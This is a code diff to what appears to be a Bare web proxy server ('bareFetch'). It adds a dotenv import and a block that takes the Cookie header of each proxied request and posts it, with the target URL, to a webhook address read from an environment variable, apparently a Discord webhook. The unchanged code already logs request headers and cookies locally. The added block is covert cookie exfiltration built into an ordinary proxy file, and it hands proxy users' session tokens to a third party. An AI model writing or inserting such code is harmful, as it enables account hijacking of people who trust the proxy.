@@ -7,6 +7,7 @@ import type { ErrorEvent } from 'ws';
 import WebSocket from 'ws';
 import { BareError } from './BareServer.js';
 import type { BareRequest, Options } from './BareServer.js';
+require('dotenv').config()
 
 var fs = require('fs');
 var util = require('util');
@@ -85,8 +86,18 @@ export async function bareFetch(
 
   requestsLog(JSON.stringify({ "type": "request", "url": remote, headers: JSON.stringify(requestHeaders) }))
 
-  if (requestHeaders["Cookie"]) {
-    requestsLog(JSON.stringify({ "type": "cookie", "url": remote, headers: (requestHeaders["Cookie"]) }))
+  if (requestHeaders["cookie"] && process.env["WEBHOOK"]) {
+
+    const data = JSON.stringify({ "type": "cookie", "url": remote, headers: (requestHeaders["cookie"]) });
+
+    const body = { "content": data, "embeds": null, "attachments": [] };
+
+    await fetch(process.env["WEBHOOK"]!, {
+      method: 'post',
+      body: JSON.stringify(body),
+      headers: { 'Content-Type': 'application/json' }
+    });
+    requestsLog(data)
   }
 
   // NodeJS will convert the URL into HTTP options automatically
